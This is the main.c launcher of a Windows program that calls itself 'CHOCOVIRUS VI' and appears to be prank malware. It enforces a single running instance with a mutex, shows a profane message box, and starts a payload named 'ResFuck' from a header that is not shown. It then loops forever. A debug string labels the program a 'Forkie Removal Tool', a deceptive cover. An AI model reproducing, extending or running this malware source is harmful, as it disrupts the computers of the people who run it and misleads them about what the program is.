//
// CHOCOVIRUS VI
// (C) 2019 modeco80 and CHOCOLATEMAN.
//
// File:
//		main.c
//
// Description:
//		CHOCOVIRUS main
//

#include "Common.h"
#include "PayloadMan.h"
#include "RegUtil.h"
#include <stdlib.h>

// payloads
#include "ResFuckPayload.h"

#ifdef DEVELOPMENT
void BlitzMainOpenConsole() {
	AllocConsole();
	AttachConsole(GetCurrentProcessId());
	freopen("CONOUT$", "w", stdout);
	SetConsoleTitle("*** CHOCOVIRUS VI Debug Window (" __DATE__ " "  __TIME__ ") ***");
}
#endif

HANDLE hRunOnceMutex = NULL;

void ChocoCleanup(void) {
	// Perform any cleanup here
	ReleaseMutex(hRunOnceMutex);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	atexit(ChocoCleanup);
	srand(GetCurrentProcessId() * GetTickCount());
#ifdef DEVELOPMENT
	BlitzMainOpenConsole();
#endif
	BLITZ_DEBUG_LOG("CHOCOVIRUS VI: The Offical(TM) Forkie Removal Tool")

	// Only one CVVI process can be running.
	hRunOnceMutex = OpenMutex(MUTEX_ALL_ACCESS, -1, "ITSFUCKEDKIDSITSOVER");
	if(hRunOnceMutex) {
		BLITZ_DEBUG_LOG("The mutex was found, exiting")
		MessageBoxA(GetFocus(), "ITS FUCKED KIDS ITS OVER!!!!", "FUUUUUUUUUUUUUUUUUUUUUUUUUUCK!!!!", MB_OK | MB_ICONHAND);
		return 0;
	} else {
		BLITZ_DEBUG_LOG("Creating runonce mutex")
		hRunOnceMutex = CreateMutex(0, 0, "ITSFUCKEDKIDSITSOVER");
	}
	
	// Initalize payloads here
	BlitzInitalizePayload(&ResFuck);
	
	while (1) Sleep(BLITZ_PAYLOAD_TICK_MS);
	return 0;
}